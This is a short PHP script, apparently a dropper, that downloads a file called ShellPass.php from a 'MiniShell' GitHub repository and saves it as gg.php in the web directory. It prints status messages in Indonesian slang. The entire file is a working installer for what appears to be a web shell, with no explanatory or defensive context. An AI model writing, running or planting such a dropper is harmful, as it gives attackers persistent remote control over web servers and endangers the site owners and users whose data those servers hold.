<?php
$url = 'https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php';
$localFilePath = __DIR__ . '/gg.php';
$content = file_get_contents($url);
if ($content !== false) {
    $result = file_put_contents($localFilePath, $content);
    if ($result !== false) {
        echo "Nahh Done Kaik...\n";
    } else {
        echo "Waduh gagal kaik...\n";
    }
} else {
    echo "Waduh gagal kaik...\n";
}
?>
